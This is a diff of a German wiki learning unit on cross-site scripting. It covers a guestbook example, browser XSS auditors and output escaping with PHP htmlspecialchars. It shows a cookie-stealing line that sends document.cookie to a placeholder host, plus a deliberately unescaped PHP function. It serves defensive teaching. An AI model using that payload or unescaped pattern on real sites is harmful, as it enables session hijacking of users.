@@ -1,44 +1,100 @@
-====== LU10a - Cross-Site Scripting (XSS) Attacks ======
+====== LU10a - Cross-Site Scripting ======
+<sup>Internal reference: lu/10-1.md</sup>
+\\
+===== Einleitung =====
+Cross-Site Scripting (kurz XSS) ist eine Form der Cyberattacke, wo Script-Code von außen in eine Webseite injiziert wird. Ziel ist es eine aktive Session (Sitzung) zu stehlen.</small>
 
-**Cross-site scripting (XSS)** is a very common type of web application attack vector in which malicious code is injected into a vulnerable web application. Unlike other attacks that target the application’s server or database directly, XSS targets the **users of the web application** — because the injected code runs in their browsers in the context of the legitimate website. 
-
-A successful XSS attack can cause serious damage — including compromised user accounts, activation of Trojan code, manipulation of page content to trick users into sharing sensitive data, or exposure of session cookies that allow attackers to impersonate valid users. 
+Bei XSS wird Script-Code von außen in die aktuelle Webseite injiziert. Damit wird eine Autorisierungsbarriere überschritten, denn Sie können so einer Website vorgaukeln, der eingeschleuste Code sei Ihr eigener. 
 
 \\
-==== Types of XSS Attacks ====
-
-There are **two major types** of cross-site scripting attacks commonly discussed:
-
-  * **Stored XSS (Persistent)** – A malicious script is permanently injected into an application and served to all users. 
-  * **Reflected XSS (Non-Persistent)** – A malicious script is embedded in a URL or request, then reflected off the web server back to the user’s browser when the link is visited. 
-
-\\
-==== What is Stored Cross-Site Scripting ====
+===== Beispiel =====
+Ein kleines Beispiel soll dies untermauern. Stellen Sie sich eine simple Gästebuch-Anwendung vor, wie Sie sie in diesem Buch öfters finden. Hier zunächst eine Gästebuch-Datenbank (mit MySQL).
 
 
-To execute a **stored XSS attack**, the attacker must find a vulnerability in a web application where user input is stored without proper validation or escaping. A common example is when a comment field or form accepts HTML input and embeds it directly into pages viewed by other users. 
+{{:modul:m183:learningunits:lu10:xss_05.png?400|Abb-01: Eine ungewöhnliche Input-Maske für Gästebuch-Einträge.}}
 
-**Example**: An attacker enters a comment containing JavaScript that steals session cookies. Every visitor who views the comment will run the malicious script unknowingly. 
+Was passiert aber, wenn Sie HTML-Code eingeben? Dieser Code wird dann ungefiltert ausgegeben. Sie können das Layout des Gästebuches verschandeln, beispielsweise durch das Einbinden anstößiger Grafiken. Abb-02 und Abb-03 zeigt eine harmlosere Variante, nämlich die Verwendung von ''<h1>'' und ''<hr>'' als HTML-Tags im Gästebuch-Eintrag.
 
-\\
-==== Stored XSS Attack — Step by Step ====
-{{:modul:m183:learningunits:lu10:stored-xss.png?600}}
+{{:modul:m183:learningunits:lu10:xss_03a.png?400|Abb-02: Verwendung von HTML-Tags.}}
 
-    - The attacker discovers a page with an input field that allows HTML.
-    - They insert malicious JavaScript code into that field. 
-    - The application stores and later serves that code as part of normal content.
-    - When other users visit the page, their browser executes the attack script. 
+{{:modul:m183:learningunits:lu10:xss_03b.png?400|Abb-03: Ausgabe mit HTML-Tags.}}
 
-\\
-==== How Stored XSS Endangers Users ====
-Stored XSS is especially dangerous because:
+Das allein ist ja schon schlimm genug, doch noch übler wird es, wenn statt HTML-Code JavaScript-Code eingeschleust wird. Da gibt es verschiedene Stufen der Grausamkeiten
+  * Öffnen von modalen Warnfenstern mit ''window.alert()''
+  * unendliches Neuladen der Seite mit ''window.reload()''
+  * die Umleitung des Benutzers mit ''location.href = &quot;http://andererserver.xy&quot;''
+  * das Auslesen aller Cookies, beispielsweise mit ''location.href = &quot;http://andererserver.xy/cookieklau.php?c=&quot; + escape(document.cookie)''
 
-  * It can impact **all users** who view the infected page. 
-  * Attacker-controlled scripts can steal session credentials or redirect users to phishing sites. 
-  * Malicious payloads can embed external JavaScript that reports user data back to the attacker. 
+Aus guten Gründen wird dies nicht weiter ausgeführt, aber Abbildung 04 und 05 zeigen die Auswirkung der ersten Angriffsmethode. Ferner überlegen Sie, was alles in Cookies stehen könnte: die aktuelle Session-ID beispielsweise. Damit ist es sehr einfach möglich, die Session eines Opfers zu übernehmen (das nennt man dann ''Session Hijacking'')
+
+{{:modul:m183:learningunits:lu10:xss_04.png?400|Abb-04: Mit mangelhaften Outputescaping und vor allem bei älteren Browsern kann ein Javascript als Eintrag ausgeführt werden.}}
+
+{{:modul:m183:learningunits:lu10:xss_03.png?400|Abb-05: Nach dem Speichern und beim Laden der Seite macht sich das JavaScript bemerkbar.}}
+
 
 \\
-==== Related Topics ====
-[1]: https://owasp.org/www-community/attacks/xss/ "Cross Site Scripting (XSS) | OWASP"
+===== XSS-Auditor =====
+Die Gefahr für ''XSS'' ist primär bei alten Browser gegeben. Die neuen Browser (sicher bei Safari, Chrome, Firefox) weist ein sog. ''XSS-Auditor'' unterbindet die Ausführung von JavaScripts, wenn er eine XSS-Attacke vermutet (s. Abb-06.)
 
-[2]: https://developer.mozilla.org/docs/Web/Security/Attacks/XSS?utm_source=chatgpt.com "Cross-site scripting (XSS) - Security | MDN"
+{{:modul:m183:learningunits:lu10:xss_02.png?400|Abb-06: Der XSS-Auditor unterbindet die Ausführung des JavaScripts.}}
+
+\\
+===== Gegenmassnahmen =====
+Wirkungsvoll gegen XSS ist 
+  * gründliche Input-Validierung
+  * Output-Escaping (in PHP mit der Funktion ''htmlspecialchars'')
+
+\\
+===== Output-Escaping =====
+Ziel des Output-Escaping ist, dass im Webbrowser die Benutzereingaben niemals als Teil der Seite (d.h. mit deren HTML-Code) ausgeführt werden. Stattdessen werden die Benutzereingaben sozusagen entschärft und wie gewöhnliche Texte als ungefährlicher statischer Inhalt angezeigt.
+In PHP wird h
+
+\\
+===== Beispiel =====
+Im folgenden Beispiel wird die eigene Funktion ''leseFeld'' mit der PHP-Funktion ''htmlspecialchars'' angepasst, damit sämtliche Ausgaben auf dem Browser *entschärft  * (also ausführbaren HTML resp. JavaScript-Code durch den Browser nicht ausgeführt) werden.
+
+**Code-01: ohne Escaping ->  unsicherer PHP-Code**
+<code>
+...
+/**
+   * Liest ein einfaches Textfeld aus dem Formular aus
+   * @param $feld - Datenfeld, welches ausgelesen wird
+   * @return string - ausgelesenes Datenfeld als String
+ */
+function leseFeld($feld)
+{
+    if (!isset($_POST[$feld])) {
+        return LEER_STRING;
+    }
+    if (!is_string($_POST[$feld])) {
+        return LEER_STRING;
+    }
+    return $_POST[$feld];
+}
+...
+</code>
+
+**Code-02: mit Escaping ->  sicherer PHP-Code**
+<code>
+...
+/**
+   * Liest ein einfaches Textfeld aus dem Formular aus
+   * @param $feld - Datenfeld, welches ausgelesen wird
+   * @return string - ausgelesenes Datenfeld als String
+ */
+function leseFeld($feld)
+{
+    if (!isset($_POST[$feld])) {
+        return LEER_STRING;
+    }
+    if (!is_string($_POST[$feld])) {
+        return LEER_STRING;
+    }
+    return htmlspecialchars($_POST[$feld]);
+}
+...
+</code>
+
+----
+
+[[https://creativecommons.org/licenses/by-nc-sa/4.0/|{{https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png}}]] Daniel Garavaldi
